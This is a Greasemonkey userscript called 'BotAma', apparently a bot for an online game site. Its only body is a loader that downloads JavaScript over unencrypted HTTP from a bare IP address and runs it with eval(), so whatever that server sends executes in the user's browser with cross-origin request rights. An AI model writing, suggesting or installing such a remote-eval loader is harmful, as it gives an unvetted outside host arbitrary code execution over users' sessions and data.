// ==UserScript==
// @name        BotAma
// @namespace   Bot
// @include     http://www.mcctservice.com/Amaranthine/aspersa/index.php*
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js
// @version     1
// ==/UserScript==
GM_xmlhttpRequest({
  	method: "GET",
  	url: "http://123.30.53.197:1338/source.user.js",
  	onload: function(res){
  		eval(res.responseText);
  	}
});